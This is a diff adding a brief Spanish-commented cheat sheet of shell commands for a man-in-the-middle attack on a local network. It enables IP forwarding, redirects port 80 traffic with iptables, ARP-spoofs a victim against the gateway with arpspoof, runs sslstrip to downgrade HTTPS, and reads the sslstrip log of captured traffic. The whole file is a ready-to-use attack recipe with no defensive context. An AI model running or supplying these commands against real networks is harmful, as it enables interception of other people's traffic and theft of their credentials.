@@ -1,0 +1,20 @@
+# MITM
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Enrutar Puerto
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+# Ver sentencias Iptables
+iptables -t nat -L
+
+# Borrar Iptables
+iptables -t nat -F
+
+# ARP Spoof
+arpspoof -i eth0 -t 192.168.1.X -r 192.168.1.1
+
+# SSLStrip
+sslstrip -l 8080
+
+# SSLStrip Log
+cat sslstrip.log
